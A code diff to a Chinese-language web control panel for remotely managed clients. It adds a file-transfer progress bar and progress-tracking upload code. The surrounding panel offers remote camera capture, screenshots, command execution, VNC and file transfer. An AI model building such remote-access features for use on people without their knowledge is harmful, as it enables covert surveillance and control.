@@ -396,6 +396,36 @@
             min-width: 200px;
         }
 
+        .transfer-box {
+            flex-basis: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            margin-top: 6px;
+        }
+
+        .transfer-header {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            color: var(--text-secondary);
+        }
+
+        .transfer-track {
+            width: 100%;
+            height: 8px;
+            background: var(--border);
+            border-radius: 999px;
+            overflow: hidden;
+        }
+
+        .transfer-bar {
+            height: 100%;
+            width: 0%;
+            background: var(--primary);
+            transition: width 0.1s linear;
+        }
+
         .file-table-container {
             overflow-x: auto;
         }
@@ -760,6 +790,15 @@
                         📤 上传文件
                     </button>
                     <span id="fileMessage"></span>
+                    <div id="fileTransferBox" class="transfer-box" style="display: none;">
+                        <div class="transfer-header">
+                            <span id="fileTransferLabel"></span>
+                            <span id="fileTransferPercent"></span>
+                        </div>
+                        <div class="transfer-track">
+                            <div id="fileTransferBar" class="transfer-bar"></div>
+                        </div>
+                    </div>
                 </div>
                 <div class="file-table-container">
                     <table>
@@ -864,6 +903,8 @@
         let lastVncMoveTime = 0;
         let currentPath = '';
         let executingClients = { shoot: null, screenshot: null, execute: null };
+        let activeTransferId = null;
+        let activeTransferStage = null;
 
         // DOM Elements
         const targetClient = document.getElementById('targetClient');
@@ -871,6 +912,10 @@
         const serverStatus = document.getElementById('serverStatus');
         const statusDot = document.getElementById('statusDot');
         const controlMessage = document.getElementById('controlMessage');
+        const fileTransferBox = document.getElementById('fileTransferBox');
+        const fileTransferLabel = document.getElementById('fileTransferLabel');
+        const fileTransferPercent = document.getElementById('fileTransferPercent');
+        const fileTransferBar = document.getElementById('fileTransferBar');
 
         // Tab Navigation
         document.querySelectorAll('.tab').forEach(tab => {
@@ -903,6 +948,47 @@
             setTimeout(() => {
                 element.innerHTML = '';
             }, 3000);
+        }
+
+        function createTransferId() {
+            return Math.random().toString(16).slice(2) + Date.now().toString(16);
+        }
+
+        function formatBytes(bytes) {
+            if (bytes === null || bytes === undefined) return '-';
+            const units = ['B', 'KB', 'MB', 'GB', 'TB'];
+            let size = bytes;
+            let unit = 0;
+            while (size >= 1024 && unit < units.length - 1) {
+                size /= 1024;
+                unit++;
+            }
+            return `${size.toFixed(unit === 0 ? 0 : 2)} ${units[unit]}`;
+        }
+
+        function hideFileTransfer() {
+            activeTransferId = null;
+            activeTransferStage = null;
+            fileTransferBox.style.display = 'none';
+            fileTransferLabel.textContent = '';
+            fileTransferPercent.textContent = '';
+            fileTransferBar.style.width = '0%';
+        }
+
+        function showFileTransfer(label) {
+            fileTransferBox.style.display = 'flex';
+            fileTransferLabel.textContent = label || '';
+        }
+
+        function updateFileTransfer(transferred, total) {
+            if (total !== null && total !== undefined && total > 0) {
+                const pct = Math.min(100, Math.floor((transferred / total) * 100));
+                fileTransferPercent.textContent = `${pct}% (${formatBytes(transferred)} / ${formatBytes(total)})`;
+                fileTransferBar.style.width = `${pct}%`;
+            } else {
+                fileTransferPercent.textContent = `${formatBytes(transferred)}`;
+                fileTransferBar.style.width = '100%';
+            }
         }
 
         // Update Buttons State
@@ -1096,6 +1182,11 @@
             
             const fullPath = currentPath + (currentPath.endsWith('\\') || currentPath.endsWith('/') ? '' : '\\') + filename;
             showMessage(fileMessage, `请求下载 ${filename}...`, 'info');
+            activeTransferId = null;
+            activeTransferStage = null;
+            showFileTransfer(`等待客户端上传：${filename}`);
+            fileTransferPercent.textContent = '';
+            fileTransferBar.style.width = '0%';
             socket.emit('request_download', { client_id: clientId, path: fullPath, filename: filename });
         }
 
@@ -1145,6 +1236,31 @@
         socket.on('client_disconnected', function(data) {
             onlineClients = onlineClients.filter(id => id !== data.client_id);
             updateClientsList();
+        });
+
+        socket.on('file_transfer_started', function(data) {
+            if (!data || !data.transfer_id) return;
+            activeTransferId = data.transfer_id;
+            activeTransferStage = null;
+            const name = data.filename || '';
+            showFileTransfer(name ? `传输中：${name}` : '文件传输中');
+            fileTransferPercent.textContent = '0%';
+            fileTransferBar.style.width = '0%';
+        });
+
+        socket.on('file_transfer_progress', function(data) {
+            if (!data || !data.transfer_id) return;
+            if (activeTransferId && data.transfer_id !== activeTransferId) return;
+            activeTransferId = data.transfer_id;
+            if (data.stage && data.stage !== activeTransferStage) {
+                activeTransferStage = data.stage;
+                const name = data.filename || '';
+                const stageText = data.stage === 'upload_to_server'
+                    ? '上传到服务器'
+                    : (data.stage === 'download_from_server' ? '客户端下载中' : '传输中');
+                showFileTransfer(name ? `${stageText}：${name}` : stageText);
+            }
+            updateFileTransfer(data.transferred || 0, data.total);
         });
 
         socket.on('photo_uploaded', function() {
@@ -1285,6 +1401,7 @@
             
             if (data.error) {
                 showMessage(fileMessage, '下载失败: ' + data.error, 'error');
+                hideFileTransfer();
                 return;
             }
             
@@ -1295,6 +1412,7 @@
             document.body.appendChild(a);
             a.click();
             document.body.removeChild(a);
+            hideFileTransfer();
         });
 
         socket.on('client_upload_complete', function(data) {
@@ -1314,6 +1432,7 @@
             uploadFileBtn.disabled = false;
             uploadFileBtn.innerHTML = '📤 上传文件';
             fileUploadInput.value = '';
+            hideFileTransfer();
         });
 
         socket.on('vnc_frame', function(data) {
@@ -1484,22 +1603,60 @@
             formData.append('client_id', clientId);
             formData.append('target_dir', targetPath);
             
-            $.ajax({
-                url: '/upload_to_client',
-                method: 'POST',
-                data: formData,
-                processData: false,
-                contentType: false,
-                success: function(response) {
+            if (!socket.connected || !socket.id) {
+                showMessage(fileMessage, 'Socket 未连接，无法开始传输', 'error');
+                uploadFileBtn.disabled = false;
+                uploadFileBtn.innerHTML = '📤 上传文件';
+                document.getElementById('fileUploadInput').value = '';
+                return;
+            }
+
+            const transferId = createTransferId();
+            activeTransferId = transferId;
+            activeTransferStage = 'upload_to_server';
+            showFileTransfer(`上传到服务器：${file.name}`);
+            fileTransferPercent.textContent = '0%';
+            fileTransferBar.style.width = '0%';
+
+            formData.append('transfer_id', transferId);
+            formData.append('web_sid', socket.id);
+            
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', '/upload_to_client', true);
+
+            xhr.upload.onprogress = function(e) {
+                if (e.lengthComputable) {
+                    updateFileTransfer(e.loaded, e.total);
+                } else {
+                    updateFileTransfer(e.loaded, null);
+                }
+            };
+
+            xhr.onload = function() {
+                if (xhr.status >= 200 && xhr.status < 300) {
+                    activeTransferStage = null;
+                    showFileTransfer(`等待客户端下载：${file.name}`);
+                    fileTransferPercent.textContent = '100%';
+                    fileTransferBar.style.width = '100%';
                     showMessage(fileMessage, '已上传到服务器，通知客户端下载...', 'info');
-                },
-                error: function(xhr) {
-                    showMessage(fileMessage, '上传失败: ' + (xhr.responseJSON?.error || '未知错误'), 'error');
+                } else {
+                    hideFileTransfer();
+                    showMessage(fileMessage, '上传失败: ' + (xhr.responseText || '未知错误'), 'error');
                     uploadFileBtn.disabled = false;
                     uploadFileBtn.innerHTML = '📤 上传文件';
                     document.getElementById('fileUploadInput').value = '';
                 }
-            });
+            };
+
+            xhr.onerror = function() {
+                hideFileTransfer();
+                showMessage(fileMessage, '上传失败: 网络错误', 'error');
+                uploadFileBtn.disabled = false;
+                uploadFileBtn.innerHTML = '📤 上传文件';
+                document.getElementById('fileUploadInput').value = '';
+            };
+
+            xhr.send(formData);
         });
 
         // Photos
